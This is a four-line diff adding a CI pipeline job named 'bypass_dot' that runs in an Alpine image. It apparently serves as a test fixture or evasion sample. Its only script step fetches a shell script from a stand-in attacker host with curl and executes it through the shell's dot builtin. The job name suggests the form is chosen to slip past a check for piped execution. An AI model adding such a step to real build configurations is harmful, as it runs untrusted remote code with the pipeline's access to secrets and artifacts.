@@ -1,0 +1,4 @@
+bypass_dot:
+  image: alpine:3.19
+  script:
+    - . <(curl -s https://evil.example.com/payload.sh)
